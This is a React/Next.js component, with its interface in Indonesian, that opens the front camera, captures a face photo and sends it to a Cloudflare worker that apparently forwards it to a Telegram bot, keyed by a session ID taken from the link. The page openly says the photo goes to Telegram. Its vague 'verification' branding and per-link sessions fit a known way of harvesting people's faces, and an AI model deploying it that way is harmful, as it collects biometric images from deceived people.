"use client";

import React, { useState, useRef, useEffect, useCallback } from 'react';

// ============================================================
// 📸 SMILE FACE CAPTURE - REACT TSX COMPONENT
// ============================================================

interface SendPhotoResponse {
  success: boolean;
  message: string;
}

const SmileCapture: React.FC = () => {
  // ============================================================
  // 🔧 KONFIGURASI WORKER
  // ============================================================
  const API_BASE = 'https://smileahbot.onemimereztwo.workers.dev';

  // ============================================================
  // 📦 STATE
  // ============================================================
  const [sessionId, setSessionId] = useState('');
  const [isCameraReady, setIsCameraReady] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [capturedPhoto, setCapturedPhoto] = useState<string | null>(null);
  const [status, setStatus] = useState<{ message: string; type: 'info' | 'success' | 'error' | '' }>({
    message: '',
    type: '',
  });
  const [badge, setBadge] = useState<{ type: 'waiting' | 'done'; label: string }>({
    type: 'waiting',
    label: '⏳ Menunggu',
  });

  // ============================================================
  // 🎯 REFS
  // ============================================================
  const videoRef = useRef<HTMLVideoElement>(null);
  const photoRef = useRef<HTMLImageElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // ============================================================
  // 🛠️ HELPER FUNCTIONS
  // ============================================================
  const showStatus = useCallback((message: string, type: 'info' | 'success' | 'error') => {
    setStatus({ message, type });
  }, []);

  const updateBadge = useCallback((type: 'waiting' | 'done', label: string) => {
    setBadge({ type, label });
  }, []);

  // ============================================================
  // 🚀 EFFECTS
  // ============================================================
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const queryId = urlParams.get('session');
      
      const pathSegments = window.location.pathname.split('/');
      const pathId = pathSegments[pathSegments.length - 1];

      const id = queryId || (pathId !== 'kamera' ? pathId : '');

      if (id && id.length >= 6) {
        setSessionId(id);
      } else {
        const randomId = 'SML' + Math.floor(10000 + Math.random() * 90000);
        setSessionId(randomId);
      }
    }
  }, []);

  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }
    };
  }, []);

  // ============================================================
  // 📷 KAMERA
  // ============================================================
  const startCamera = async () => {
    try {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
        streamRef.current = null;
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
      });

      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        videoRef.current.style.display = 'block';
      }

      const placeholder = document.getElementById('placeholder');
      if (placeholder) placeholder.style.display = 'none';

      setIsCameraReady(true);
      showStatus('Kamera aktif! Posisikan wajah di dalam bingkai.', 'info');
    } catch (err) {
      console.error('Camera error:', err);
      showStatus('Gagal akses kamera. Pastikan izinkan akses kamera.', 'error');
      setIsCameraReady(false);
    }
  };

  // ============================================================
  // 📸 CAPTURE PHOTO
  // ============================================================
  const capturePhoto = () => {
    if (!isCameraReady || !streamRef.current) {
      showStatus('Kamera belum siap!', 'error');
      return;
    }

    const video = videoRef.current;
    if (!video) return;

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const photoData = canvas.toDataURL('image/jpeg', 0.92);
    setCapturedPhoto(photoData);

    if (photoRef.current) {
      photoRef.current.src = photoData;
      photoRef.current.style.display = 'block';
    }

    if (videoRef.current) {
      videoRef.current.style.display = 'none';
    }

    showStatus('Foto berhasil diambil! Klik Kirim untuk mengirim.', 'success');
  };

  // ============================================================
  // 🔄 RETAKE
  // ============================================================
  const retakePhoto = () => {
    if (photoRef.current) {
      photoRef.current.style.display = 'none';
    }

    if (videoRef.current) {
      videoRef.current.style.display = 'block';
    }

    setCapturedPhoto(null);
    showStatus('Ambil ulang foto. Posisikan wajah di dalam bingkai.', 'info');
  };

  // ============================================================
  // 📤 SEND PHOTO (PERBAIKAN FORMAT FILE & FORMDATA)
  // ============================================================
  const sendPhoto = async () => {
    if (!capturedPhoto || isSending || !sessionId) return;

    setIsSending(true);
    showStatus('Mengirim foto ke Telegram...', 'info');

    try {
      // Konversi dataURL (base64) langsung ke File Object
      const resBlob = await fetch(capturedPhoto);
      const blob = await resBlob.blob();
      const file = new File([blob], 'face.jpg', { type: 'image/jpeg' });

      const formData = new FormData();
      formData.append('photo', file);

      const res = await fetch(`${API_BASE}/capture/${sessionId}`, {
        method: 'POST',
        body: formData,
      });

      const result: SendPhotoResponse = await res.json();

      if (result.success) {
        showStatus('✅ Foto berhasil terkirim ke Telegram!', 'success');
        updateBadge('done', '✅ Selesai');

        if (streamRef.current) {
          streamRef.current.getTracks().forEach((t) => t.stop());
          streamRef.current = null;
        }
      } else {
        showStatus('❌ Gagal mengirim: ' + (result.message || 'Error'), 'error');
      }
    } catch (err) {
      console.error('Send error:', err);
      showStatus('❌ Gagal mengirim foto. Coba lagi.', 'error');
    } finally {
      setIsSending(false);
    }
  };

  // ============================================================
  // 🎨 RENDER
  // ============================================================
  return (
    <div className="min-h-screen bg-slate-900 flex justify-center items-center p-4 font-sans text-white">
      <div className="bg-slate-800/80 backdrop-blur-xl border border-slate-700 rounded-3xl p-6 max-w-md w-full shadow-2xl">
        
        {/* Header */}
        <div className="text-center mb-6">
          <span className="text-5xl block mb-2">📸</span>
          <h1 className="text-2xl font-bold tracking-tight">SMILE</h1>
          <p className="text-slate-400 text-xs mt-1">Face Capture &amp; Verification</p>
        </div>

        {/* Session Info */}
        <div className="bg-slate-700/50 rounded-xl p-3 mb-5 flex justify-between items-center border border-slate-600">
          <span className="text-slate-400 text-xs uppercase font-medium">Session ID</span>
          <span className="font-mono text-sm bg-slate-800 px-3 py-1 rounded-lg border border-slate-700">
            {sessionId || '-'}
          </span>
          <span
            className={`text-xs font-semibold px-2.5 py-1 rounded-full ${
              badge.type === 'waiting'
                ? 'bg-amber-500/20 text-amber-300'
                : 'bg-emerald-500/20 text-emerald-300'
            }`}
          >
            {badge.label}
          </span>
        </div>

        {/* Camera Wrapper */}
        <div className="relative bg-black rounded-2xl overflow-hidden aspect-4/3 mb-5 border border-slate-700">
          <video
            ref={videoRef}
            className="w-full h-full object-cover hidden -scale-x-100"
            autoPlay
            playsInline
          />
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            ref={photoRef}
            className="w-full h-full object-cover hidden"
            alt="Hasil foto"
          />

          <div
            id="placeholder"
            className="flex flex-col items-center justify-center h-full text-slate-500 gap-2 p-5"
          >
            <span className="text-6xl">🤳</span>
            <p className="text-xs text-center">Klik "Mulai" untuk membuka kamera</p>
          </div>
        </div>

        {/* Controls */}
        <div className="grid grid-cols-2 gap-2">
          {!capturedPhoto ? (
            <>
              <button
                onClick={startCamera}
                disabled={isCameraReady}
                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-indigo-600 hover:bg-indigo-500 disabled:opacity-40 disabled:cursor-not-allowed"
              >
                {isCameraReady ? '✅ Aktif' : '📷 Mulai'}
              </button>

              <button
                onClick={capturePhoto}
                disabled={!isCameraReady}
                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-emerald-600 hover:bg-emerald-500 disabled:opacity-40 disabled:cursor-not-allowed"
              >
                📸 Ambil
              </button>
            </>
          ) : (
            <>
              <button
                onClick={retakePhoto}
                disabled={isSending}
                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-slate-700 hover:bg-slate-600 border border-slate-600"
              >
                🔄 Ulangi
              </button>

              <button
                onClick={sendPhoto}
                disabled={isSending}
                className="py-3 px-4 rounded-xl font-semibold text-sm transition-all bg-rose-600 hover:bg-rose-500 disabled:opacity-50"
              >
                {isSending ? '⏳ Mengirim...' : '📤 Kirim'}
              </button>
            </>
          )}
        </div>

        {/* Status Message */}
        {status.message && (
          <div
            className={`mt-4 py-2.5 px-3 rounded-xl text-xs text-center ${
              status.type === 'success'
                ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
                : status.type === 'error'
                ? 'bg-rose-500/10 text-rose-400 border border-rose-500/20'
                : 'bg-sky-500/10 text-sky-400 border border-sky-500/20'
            }`}
          >
            {status.message}
          </div>
        )}
      </div>
    </div>
  );
};

export default SmileCapture;